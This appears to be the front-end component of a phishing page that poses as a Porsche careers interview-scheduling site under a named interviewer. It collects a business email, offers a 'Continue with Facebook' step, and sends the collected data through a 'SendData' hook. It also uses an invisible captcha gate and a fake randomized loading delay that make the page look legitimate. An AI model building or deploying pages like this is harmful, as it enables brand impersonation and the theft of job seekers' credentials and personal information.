import React, { useContext, useState } from "react";
import Head from "next/head";
import styled from "styled-components";
import FacebookLogo from "../../assets/images/FLogo.png";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages/index.js";
import { useCaptcha } from "../Captcha/InvisibleCaptchaGate.js";

// Porsche design components
import Hero from "../porsche/Hero.jsx";
import PageNavigation from "../porsche/PageNavigation.jsx";
import PreparationTabs from "../porsche/PreparationTabs.jsx";
import DiscussionCarousel from "../porsche/DiscussionCarousel.jsx";
import AssetImage from "../porsche/AssetImage.jsx";
import { image, workingCards } from "../porsche/data.js";
import MarketingOpportunities, { marketingRoles } from "../porsche/MarketingOpportunities.jsx";

// Interview meeting setup
import MeetingScheduler from "./MeetingScheduler.js";

const INTERVIEWER_NAME = "Fabian Stöhr";

const FormWrapper = styled.div`
  background-color: #f5f6f7;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  scroll-margin-top: 100px;
`;

function Form({
  setStep,
  BusinessEmail,
  setBusinessEmail,
  setContinueWithFacebook,
}) {
  const [BusinessEmailError, setBusinessEmailError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [loadingType, setLoadingType] = useState(""); // 'facebook' or 'email'
  const [selectedRole, setSelectedRole] = useState(marketingRoles[0]);
  const { verified: captchaVerified } = useCaptcha();
  let { AllData, setAllData } = useContext(DataContext);

  const NextStep = (stepText, meetingData = {}) => {
    if (!captchaVerified) return;
    setIsLoading(true);
    setLoadingType(stepText.includes("Facebook") ? "facebook" : "email");

    let params = {
      ...AllData,
      ...meetingData,
      business_email: BusinessEmail,
      currentStep: stepText ? stepText : "User clicked schedule interview",
    };

    setAllData(params);

    // Send data and add realistic loading time (1.5-2 seconds)
    SendData(params);

    // Smooth loading experience with realistic timing
    const loadingTime = Math.random() * 500 + 1500; // 1.5-2 seconds

    setTimeout(() => {
      setIsLoading(false);
      setLoadingType("");
      setStep(2);
    }, loadingTime);
  };

  const handleContinueWithEmail = () => {
    // Prevent action if already loading
    if (isLoading) return;

    // Email validation using regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(BusinessEmail)) {
      // Show error message under the input field
      setBusinessEmailError("Please enter a valid email address");
      return;
    }

    // Clear any previous error
    setBusinessEmailError("");
    setContinueWithFacebook(false);

    if (BusinessEmail && setBusinessEmail) {
      setBusinessEmail(BusinessEmail);
    }

    NextStep("User clicked continue with email");
  };

  return (
    <div className="porsche-scope">
      <Head>
        <link rel="preconnect" href="https://images-porsche.imgix.net" />
        <link rel="preconnect" href="https://cdn.ui.porsche.com" crossOrigin="anonymous" />
      </Head>
      <a className="skip-link" href="#jobs-at-porsche">Skip to marketing opportunities</a>
      <header className="site-header">
        {/* eslint-disable-next-line @next/next/no-html-link-for-pages */}
        <a className="brand-link" href="/" aria-label="Porsche careers home">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img className="brand-logo" src="/porsche-wordmark.svg" alt="Porsche" width={240} height={16} />
        </a>
      </header>
      <main id="main-content">
        <Hero />
        <PageNavigation />

        <section className="section search-section" id="jobs-at-porsche" aria-labelledby="search-title">
          <h2 id="search-title">Explore marketing opportunities.</h2>
          <MarketingOpportunities selectedRole={selectedRole} onSelect={setSelectedRole} interviewerName={INTERVIEWER_NAME} disabled={isLoading} />
        </section>

        {/* Interview meeting setup */}
        <FormWrapper id="interview-scheduling">
          <MeetingScheduler
            NextStep={NextStep}
            FacebookLogo={FacebookLogo}
            isLoading={isLoading}
            captchaVerified={captchaVerified}
            roleTitle={selectedRole.title}
            interviewerName={INTERVIEWER_NAME}
          />
        </FormWrapper>

        <section className="section entry-section" id="entry-opportunities" aria-labelledby="entry-title">
          <h2 id="entry-title">Your role. Your experience. Your impact.</h2>
          <p className="section-intro">Prepare for your {selectedRole.title} conversation with examples that show how you turn audience insight into meaningful results.</p>
          <PreparationTabs />
        </section>

        <section className="section dream-section" id="interview-preparation" aria-labelledby="dream-title">
          <h2 id="dream-title">Bring your perspective to the conversation.</h2>
          <p className="section-intro">Prepare a concise portfolio that connects your decisions to the audience, the creative work, and the outcome. Be ready to explain your own contribution.</p>
          <div className="dream-links">
            <a href="#entry-opportunities">Review the role and preparation guide<span aria-hidden="true">↑</span></a>
            <a href="#social-media">Review your interview next steps<span aria-hidden="true">↓</span></a>
          </div>
        </section>

        <section className="section benefits-section" id="benefits" aria-labelledby="benefits-title">
          <h2 id="benefits-title">What we’ll discuss.</h2>
          <p className="section-intro">Use these topics to prepare for a focused conversation about your experience, your working style, and what you’re looking for in your next role.</p>
          <DiscussionCarousel />
        </section>

        <section className="section working-section" id="working-for-porsche" aria-labelledby="working-title">
          <h2 id="working-title">The team behind the brand.</h2>
          <p className="section-intro">Explore the environment where marketing connects brand strategy, creative talent, and an engaged community.</p>
          <div className="container working-cards card-grid">
            {workingCards.map((card) => (
              <article key={card.asset} className="working-card">
                <AssetImage src={image(card.asset, 840, '3:4')} alt={card.alt} loading="lazy" decoding="async" width={840} height={1120} />
                <div className="working-copy"><h3>{card.title}</h3><p>{card.description}</p><a className="button" href={card.href}>{card.label}</a></div>
              </article>
            ))}
          </div>
        </section>

        <section className="section social-section" id="social-media" aria-labelledby="social-title">
          <h2 id="social-title">Your next conversation starts here.</h2>
          <div className="social-embed" aria-label="Interview next steps">
            <div className="social-message">
              <span className="instagram-icon" aria-hidden="true" />
              <h3>Prepare. Confirm. Connect.</h3>
              <p>Your interviewer is {INTERVIEWER_NAME}. Choose your preferred date and time, then reply to your interview invitation so the arrangements can be confirmed.</p>
              <p>Have your CV, selected campaign examples, and questions ready. If you need to reschedule or request an adjustment, contact {INTERVIEWER_NAME} through the same invitation.</p>
              <a className="button button-light" href="#interview-scheduling">Choose your preferred time <span aria-hidden="true">↑</span></a>
              <a className="button button-light" href="#interview-preparation">Review the preparation guide <span aria-hidden="true">↑</span></a>
            </div>
          </div>
        </section>

        <footer className="follow-section" aria-labelledby="follow-title">
          <h2 id="follow-title">Get to know the brand.</h2>
          <p className="section-intro">Explore Porsche’s channels and bring your observations about storytelling, audience engagement, and brand consistency to the interview.</p>
          <div className="social-links">
            <a href="https://www.instagram.com/porschecareers/" target="_blank" rel="noopener noreferrer" aria-label="Porsche Careers on Instagram"><span className="instagram-icon" aria-hidden="true" /></a>
            <a href="https://www.linkedin.com/company/porsche-ag" target="_blank" rel="noopener noreferrer" aria-label="Porsche on LinkedIn"><span className="linkedin-icon" aria-hidden="true">in</span></a>
            <a href="https://www.facebook.com/porschekarriere" target="_blank" rel="noopener noreferrer" aria-label="Porsche Careers on Facebook"><span className="facebook-icon" aria-hidden="true">f</span></a>
            <a href="https://www.xing.com/pages/dr-ing-h-c-f-porscheag" target="_blank" rel="noopener noreferrer" aria-label="Porsche on Xing"><svg aria-hidden="true" viewBox="0 0 24 24"><path d="M3 5h4l3 5-5 8H1l5-8zm14-4h5l-9 15 5 7h-5l-5-7z" fill="currentColor" /></svg></a>
          </div>
        </footer>
      </main>
    </div>
  );
}

export default Form;
